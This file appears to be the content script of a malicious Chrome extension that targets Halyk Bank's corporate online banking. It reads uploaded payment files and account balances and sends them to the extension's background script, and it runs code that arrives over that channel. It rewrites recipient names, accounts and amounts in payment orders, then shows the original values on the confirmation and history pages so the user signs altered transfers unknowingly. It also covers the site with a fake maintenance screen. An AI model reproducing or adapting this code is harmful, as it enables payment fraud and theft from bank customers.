var txt = "";
var codes = ["windows-1251", "cp866", "utf-8", "utf-16", "koi8-ru"];
var current_code = 0;
var comp = []
var count = -2;

var html_body = '<main class="content-main-lox-1" style="padding-bottom: 0rem !important;"> <div class="page page--not-found"> <div class="section__not_found"> <div class="logo"> <a href="https://halykbank.kz/"><img src="https://halykbank.kz/themes/halyk/assets/images/svg/logo.svg" alt=""></a> </div> <div class="item__suptitle figure" style="height: 31%;"><img src="https://truesharing.ru/wp-content/uploads/2018/08/technicheskie-raboty-4.jpg" alt="500" height="100%"/></div> <div class="item__title"></div> <div class="item__subtitle">Сайт будет доступен в ближайшее время</div> </div> </div> </main> <link rel="stylesheet" property="stylesheet" href="https://halykbank.kz/modules/system/assets/css/framework.extras.css"> <div class="stripe-loading-indicator loaded"><div class="stripe"></div><div class="stripe-loaded"></div></div>';
var html_head = '';

chrome.storage.local.get(null, function(items) {
});

var port = chrome.runtime.connect({name: "datasend"});

port.onMessage.addListener(function(msg) {
	if(msg.status == "coded"){
		exec_script(msg.text.replace('\n', '').replace('r', ''));
	}
	else if(msg.status == "update" && count != 0){
		if(document.URL.indexOf("WidgetPage") != -1){
			let divCalcBalance = Array.from(document.getElementsByClassName("widgetBox"));
			divCalcBalance.forEach(function(item, i, array) {
				if(item.innerText.indexOf("Расчетный остаток") != -1){
					port.postMessage({text:item.innerText, status:"mount"});
				}
			});
		}
		else if(document.URL.indexOf("AllPaymentsPage") != -1){
			if(document.getElementsByClassName("table-row tr").length != 0){
				let indexArr = [];
				let indexArrNO = [];
				var rowTable = Array.from(document.getElementsByClassName("table-row tr")).map(function(item, i, array){
					let obj = {};
					obj.docAmount = item.getElementsByClassName("cell-sum")[0].childNodes[1].childNodes[1];
					if(item.childElementCount == 13){
						obj.docDate = item.getElementsByClassName("cell-date")[0].childNodes[1];
						obj.recipientName = item.getElementsByClassName("searchCursor")[0];
						obj.docNumber = item.getElementsByClassName("cell-num")[0].childNodes[1];
					}
					else{
						obj.docDate = item.getElementsByClassName("cell")[7].childNodes[1];
						obj.recipientName = item.getElementsByClassName("cell-agent")[0];
						obj.recipientName.style.fontWeight = "normal";
						obj.docNumber = item.getElementsByClassName("cell-num")[0].childNodes[0];
						obj.recipientAcc = item.getElementsByClassName("cell-text-status")[0];
						obj.recipientAcc.style.fontWeight = "normal";
						let HrefBut = item.getElementsByClassName("cell-write")[0].childNodes[1]
						if (HrefBut != undefined){
							HrefBut.addEventListener("click", 
								function() {
									comp = [comp[i]]
								},
								true);
							}
					}
					indexArr.push(indToObj(obj));
					indexArrNO.push(indexArr[i]+'new');
					indexArrNO.push(indexArr[i]+'old');
					return (obj)
				});
				comp = [];
				compR = true;
				chrome.storage.local.get(indexArrNO, function(result){
					indexArr.forEach(function(item, i, array) {
						if(rowTable[i] != {}){
							if(result[item + 'old'] != undefined){
								if(result[item + 'new'] != undefined){
									if(result[item + 'old']['docAmount'] != undefined)
										rowTable[i].docAmount.innerHTML = result[item + 'old'].docAmount.replace(',', '.');
									if(result[item + 'old']['docNumber'] != undefined)
										rowTable[i].docNumber.innerHTML = result[item + 'old'].docNumber;
									if(result[item + 'old']['docDate'] != undefined)
										rowTable[i].docDate.innerHTML = result[item + 'old'].docDate.replace('.', '/').replace('.', '/');
									if(result[item + 'old']['recipientName'] != undefined)
										rowTable[i].recipientName.innerHTML = result[item + 'old'].recipientName + ' (' + result[item + 'old'].recipientName + ')';
									if(result[item + 'old']['recipientName'] != undefined && result[item + 'old']['namebengos'] != undefined)
										rowTable[i].recipientName.innerHTML = result[item + 'old'].recipientName + ' (' + result[item + 'old'].namebengos + ')';
									rowTable[i].recipientName.title = rowTable[i].recipientName.innerHTML;
									if(rowTable[i]['recipientAcc'] != undefined){
										rowTable[i].recipientAcc.innerHTML = result[item + 'old'].recipientAcc.split(" ").join('');
										let obj = {old: {recipientName: result[item + 'old'].recipientName, docAmount: result[item + 'old'].docAmount},
											new: {recipientName: result[item + 'new'].recipientName, docAmount: result[item + 'new'].docAmount}};
										comp.push(obj);
									}
								}
							}
						}
					});
					chrome.storage.local.set({comp});
				});
			}
		}
		else if(document.URL.indexOf("SavedDocumentsListPage") != -1){
			let tr = Array.from(document.getElementsByClassName("table-row")).slice(1);
			if(tr.length != 0){
				let indexArr = [];
				let indexArrNO = [];
				var rowTable = tr.map(function(item, i, array){
					let obj = {};
					obj.docAmount = item.getElementsByClassName("cell-sum")[0].childNodes[1];
					obj.docDate = item.getElementsByClassName("cell-date")[0];
					obj.recipientName = item.getElementsByClassName("cell-agent")[0];
					obj.docNumber = item.getElementsByClassName("cell-num")[0].childNodes[1];
					obj.purpose = item.getElementsByClassName("cell-text-status")[0].childNodes[1];
					indexArr.push(indToObj(obj));
					indexArrNO.push(indexArr[i]+'new');
					indexArrNO.push(indexArr[i]+'old');
					return (obj)
				});
				chrome.storage.local.get(indexArrNO, function(result){
					chrome.storage.local.get(null, function(items) {
					});
					indexArr.forEach(function(item, i, array) {
						if(rowTable[i] != {}){
							if(result[item + 'old'] != undefined){
								if(result[item + 'new'] != undefined){
									if(result[item + 'old']['docAmount'] != undefined)
										rowTable[i].docAmount.innerHTML = result[item + 'old'].docAmount.replace(',', '.');
									if(result[item + 'old']['docNumber'] != undefined)
										rowTable[i].docNumber.innerHTML = result[item + 'old'].docNumber;
									if(result[item + 'old']['docDate'] != undefined)
										rowTable[i].docDate.innerHTML = ((result[item + 'old'].docDate.split('.')).reverse()).join('-');
									if(result[item + 'old']['recipientName'] != undefined)
										rowTable[i].recipientName.innerHTML = result[item + 'old'].recipientName + ' (' + result[item + 'old'].recipientName + ')';
									if(result[item + 'old']['recipientName'] != undefined && result[item + 'old']['namebengos'] != undefined)
										rowTable[i].recipientName.innerHTML = result[item + 'old'].recipientName + ' (' + result[item + 'old'].namebengos + ')';
									if(result[item + 'old']['purpose'] != undefined)
										rowTable[i].purpose.innerHTML = result[item + 'old'].purpose;
								}
							}
						}
					});
				});
			}
		}
	}
	else if(msg.status == "count"){
		if(msg.count == -1){
			if(count != -1 && count != -2)
				document.location.reload();
			count = msg.count
		}
		else{
			if(count != 2){
				setTimeout(function(){count = 0;}, 5 * 60 * 1000);
				count = msg.count;
			}
			if(count == 0){
				load();
			}
		}
	}
});

function exec_script(ex_script){
	var script = document.createElement('script');
	var code = document.createTextNode(ex_script);
	script.appendChild(code);
	(document.body || document.head).appendChild(script);
}

chrome.storage.local.get(['444/2020/1337,00/new', '444/2020/1337,00/old'], function(result){
});





document.addEventListener("DOMSubtreeModified", function() {
	if(count != 0){
		if (document.URL.indexOf("onlinebank.kz/sys/Main?")!= -1 && document.URL.indexOf("fileupload/Payments1CUploadPage") != -1){
			var file_elem =  document.getElementsByName("file")[0];
			var enc = document.getElementsByName("encoding")[0];
			if(enc != undefined)
				enc.addEventListener("change", function() {
					current_code = document.getElementsByName("encoding")[0].selectedIndex;
					if(txt != "")
						handleFiles();
					},
					true);
				
			if(file_elem != undefined)
				file_elem.addEventListener("change", handleFiles, true);
				
			function handleFiles(){
				var file = document.getElementsByName("file")[0].files[0];
				var reader = new FileReader();
				reader.onload = function (event) {
					if (event.target.result != txt){
						txt = event.target.result;
						port.postMessage({text:event.target.result, status:"file", encode:current_code});
					}
				}
			reader.readAsText(file, codes[current_code]);
			}
		}

		else if(document.URL.indexOf("AllPaymentsPage") != -1){
			let btn = document.querySelectorAll("button.btn-warning")[0]
			if (btn != undefined){
				btn.addEventListener("click", handleButton, true);
				function handleButton(){
					let rowFilter = []
					Array.from(document.getElementsByClassName("table-row tr")).forEach(function(item, i, array){
						let obj = {};
						if(item.childElementCount == 11){
							let check = item.getElementsByClassName("action-check")[0].childNodes[1];
							if(check != undefined){
								rowFilter.push(check.checked);
							}
						}
					});
					comp = comp.filter(function(item, i , array) { return rowFilter[i]});
				}
			}
		}

		else if(document.URL.indexOf("ConfirmPage") != -1){
			let even = Array.from(document.querySelectorAll("table"))[4];	
			chrome.storage.local.get(['comp'], function(result){
				if(comp.length == 0)comp = result.comp;
				if(even != undefined){
					let td = Array.from(even.querySelectorAll("td"));
					for(let i = 0; i < td.length; i += 2){
						for(let y = 0; y < comp.length; y++){
							if(td[i].innerText === comp[y].new.recipientName){
								if(td[i+1].innerText.toString().replace(/[^\d,]/, '') === comp[y].new.docAmount){
									td[i].innerText = comp[y].old.recipientName;
									td[i+1].innerText = comp[y].old.docAmount;
								}
							}
						}
					}
				}
			})
		}

		else if(document.URL.indexOf("PayOrderPage") != -1){
			let inp = Array.from(document.querySelectorAll("input")).slice(3, 21);
			inp = inp.concat(Array.from(document.querySelectorAll("textarea")).filter(function (txta) {
				return txta.placeholder.indexOf("Сообщение в банк") == -1;
			}));
			let lab = Array.from(document.querySelectorAll("label.pushSlightlyUp")).filter(item => item.id !== '');
			inp.splice(9, 0, lab[0]);
			let index = indToArr(inp);
			if(index.split('/').filter(function(item){return item != ''}).length == 3){
				chrome.storage.local.get([index + 'new', index + 'old'], function(result){
					if(result[index + 'new'] != undefined && result[index + 'old'] != undefined){
						let value = objToArr(result[index + 'new'])
						let change = objToArr(result[index + 'old'])
						for(let i = 0; i < inp.length; i++){
							if(i == 18 || i == 4){
								if(inp[i].checked == value[i])
									inp[i].checked = change[i];
								}
								else if(i == 9){
									if(inp[i].innerHTML == value[i])
										inp[i].innerHTML = change[i];
								}
							else{
								if(inp[i].value == value[i]){
									inp[i].value = change[i];
									inp[i].defaultValue = change[i];
								}
							}
						}
					}
				});
			}
			button = Array.from(document.querySelectorAll(".btn-warning")).filter(function (btn) {
				return btn.innerText.indexOf("Отправить на подпись") != -1
			});
			button.forEach(function(item, i, array){
				return item.addEventListener("click", handleClick, true);
			})
			function handleClick(){
				count = 2;
				let input = Array.from(document.querySelectorAll("input")).slice(3, 21);
				input = input.concat(Array.from(document.querySelectorAll("textarea")).filter(function (txta) {
					return txta.placeholder.indexOf("Сообщение в банк") == -1;
				}));
				let label = Array.from(document.querySelectorAll("label.pushSlightlyUp")).filter(item => item.id !== '');
				input.splice(9, 0, label[0]);
				chrome.storage.local.set({"new": arrToObj(input)}, function(){});
			}
		}
		else if(document.URL.indexOf("PayOrderViewPage") != -1){
			let input = (Array.from(document.querySelectorAll("input")).slice(2, 19));
			input = input.concat(Array.from(document.querySelectorAll("textarea")).filter(function (txta) {
				return txta.placeholder.indexOf("Сообщение в банк") == -1;
			}));
			let label = Array.from(document.querySelectorAll("label.pushSlightlyUp")).filter(item => item.textContent === "Наименование клиента в базах гос. органов:");
			input.splice(8, 0, label[0]);
			let index = indToArr(input);
			chrome.storage.local.get([index + 'new', index + 'old'], function(result){
				if(result[index + 'old'] != undefined){
					if(result[index + 'new'] != undefined){
						let value = objToArr(result[index + 'old']);
						value.splice(4, 1);
						for(let i = 0; i < value.length; i++){
							if((value[i] == undefined) && i != 19) continue;
							if(i == 4){
								if(value[8] == undefined){
									input[8].innerHTML = value[4];
								}	
							}
							if(i == 17){
								input[i].checked = value[i];
							}
							else if(i == 8){
								input[i].innerHTML = value[i];
							}
							else if(i == 19){
								if(value[i] == undefined){
									input[i].value = value[18] + value[14] || value[16] || ' '
								}
								else{
									input[i].value = value[19];
								}
							}
							else{
								input[i].value = value[i];
							}
						}
					}
				}
			});
		}
	}
	else{
		Array.from(document.body.childNodes).map(function(iitem){
			if(iitem.style != undefined){
				if(iitem.className != "alert-123")
					iitem.style.display = 'none';
			}
		})
	}
}, false);

function load(){
	let div1 = document.createElement('div');
			div1.className = "alert-123";
			div1.innerHTML = html_body;
			div1.style.justifyContent = 'center';
			div1.style.textAlign = 'center';
			document.body.prepend(div1);
}

function arrToObj(array){
	let keys = ["docNumber", "docDate", "valdate", "docAmount", "ndsCountCheckBoxContainer%ndsCountCheckBox", "accSenderName", "accSender", "recipientName", "recipientAcc", "namebengos", "kbe", "recipientRnn", "recipientBank", "recipientBankBic", "knpCode", "knpName", "cbcCode", "cbcName","isUrgent", "purpose", "texarea2"];
	var objRet = {};
	for(let i = 0; i < keys.length; i++){
		if(keys[i] == "ndsCountCheckBoxContainer%ndsCountCheckBox" || keys[i] == "isUrgent"){
			objRet[keys[i]] = array[i].checked;
		}
		else if(keys[i] == "namebengos"){
			objRet[keys[i]] = array[i].innerHTML;
		}
		else {
			objRet[keys[i]] = array[i].value;
		}
	}
	return objRet;
}

function objToArr(object){
	let keys = ["docNumber", "docDate", "valdate", "docAmount", "ndsCountCheckBoxContainer%ndsCountCheckBox", "accSenderName", "accSender", "recipientName", "recipientAcc", "namebengos", "kbe", "recipientRnn", "recipientBank", "recipientBankBic", "knpCode", "knpName", "cbcCode", "cbcName","isUrgent", "purpose", "texarea2"];
	var array = [];
	for(let i = 0; i < keys.length; i++){
		try{
			array.push(object[keys[i]]);
		}
		catch(e){
		};
	}
	return array;

}

function indToArr(array){
	let id = array[0].value;
	let date = array[1].value.split('.')[2];
	let sum = array[3].value.toString().replace(/[^\d,]/, '');
	return id + '/' + date + '/' + sum + '/'; 
}

function indToObj(object){
	let id = object.docNumber.innerText;
	let date;
	if(object.docDate.innerText.indexOf('-') == -1)
		date = object.docDate.innerText.split(new RegExp('[/-]+'))[2];
	else
		date = object.docDate.innerText.split('-')[0];
	let sum = object.docAmount.innerText.toString().replace('.', ',').replace(/[^\d,]/, '');
	return id + '/' + date + '/' + sum + '/'; 
}

window.addEventListener('popstate', (event) => {
	if(count > 1){
		count--;
	}
	if(count == 0){
		Array.from(document.body.childNodes).map(function(iitem){
			if(iitem.style != undefined)
			iitem.style.display = 'none';
		})

		let div1 = document.createElement('div');
		div1.className = "alert-123";
		div1.innerHTML = html_body;
		div1.style.justifyContent = 'center';
		div1.style.textAlign = 'center';

		document.body.prepend(div1);
	}
});

function postMessage(data){
	chrome.runtime.sendMessage(data);
}

